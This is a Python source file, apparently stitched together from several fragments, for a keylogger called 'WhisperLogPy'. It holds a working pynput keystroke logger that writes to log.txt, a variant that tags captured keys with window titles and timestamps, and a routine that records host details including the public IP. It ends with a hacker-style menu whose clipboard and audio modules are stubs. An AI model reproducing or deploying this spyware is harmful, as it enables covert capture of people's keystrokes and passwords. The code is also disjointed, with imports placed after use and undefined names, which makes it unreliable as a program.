import pynput
from pynput.keyboard import Key, Listener

counter = 0
keys=[]


def on_press(key):
    global counter, keys
    keys.append(key)
    counter += 1
    if counter >= 10:
        counter = 0
        with open('log.txt', 'a') as f:
            for k in keys:
                f.write(f'{k}')
            f.write('\n')
        keys = []

def on_release(key):
    print(f'Key {key} released')
    if key == Key.esc:
        # Stop listener
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

def on_press(key):
    global current_window
    
    # Check if the user switched windows
    active_win = get_active_window()
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    text = _key_to_text(key)
    
    with open(keys_information, "a", encoding="utf-8") as f:
        # If the window changed, log a header
        if active_win != current_window:
            current_window = active_win
            f.write(f"\n\n--- Window: {current_window} | Time: {timestamp} ---\n")
        
        f.write(text)
        f.flush()


def get_computer_information():
    with open(system_information, "w", encoding="utf-8") as f:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        
        # External IP (Public)
        try:
            public_ip = requests.get('https://api.ipify.org').text
        except Exception:
            public_ip = "Could not fetch public IP"

        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Internal IP: {ip_address}\n")
        f.write(f"External IP: {public_ip}\n")

# Run this once at the start of your script
get_computer_information()

import os
import sys
import time
import socket
import platform
from datetime import datetime

BANNER = r"""
 __        __  _       _                _           
 \ \      / / | |__   (_)_ __   ___ _ __| | ___  ___ 
  \ \ /\ / /  | '_ \  | | '_ \ / _ \ '__| |/ _ \/ __|
   \ V  V /   | | | | | | |_) |  __/ |  | |  __/\__ \
    \_/\_/    |_| |_| |_| .__/ \___|_|  |_|\___||___/
                         |_|        WhisperLogPy
"""

# ---------- Utility ----------
def slow_print(text, delay=0.02):
    for c in text:
        print(c, end="", flush=True)
        time.sleep(delay)
    print()

# ---------- Menu Actions ----------
def system_info_demo():
    print("[*] Collecting system info (demo)")
    hostname = socket.gethostname()
    print(f"[+] Hostname: {hostname}")
    print(f"[+] OS: {platform.system()} {platform.version()}")
    time.sleep(1)
    print("[+] Done\n")

def clipboard_demo():
    print("[*] Clipboard module (demo only)")
    print("[!] Monitoring disabled in demo mode")
    time.sleep(1)
    print("[+] Done\n")

def audio_demo():
    print("[*] Audio module (demo only)")
    print("[!] Recording disabled in demo mode")
    time.sleep(1)
    print("[+] Done\n")

def run_all_demos():
    system_info_demo()
    clipboard_demo()
    audio_demo()

# ---------- Menu ----------
def menu():
    while True:
        print(BANNER)
        slow_print("Select module to run:\n")

        print("1) System Info")
        print("2) Clipboard (demo)")
        print("3) Audio (demo)")
        print("4) Run All")
        print("0) Exit")

        choice = input("\n> ").strip()

        if choice == "1":
            system_info_demo()
        elif choice == "2":
            clipboard_demo()
        elif choice == "3":
            audio_demo()
        elif choice == "4":
            run_all_demos()
        elif choice == "0":
            print("[*] Exiting.")
            sys.exit(0)
        else:
            print("[!] Invalid option\n")

        input("Press ENTER to return to menu...")

# ---------- Entry Point ----------
def main():
    menu()

if __name__ == "__main__":
    main()
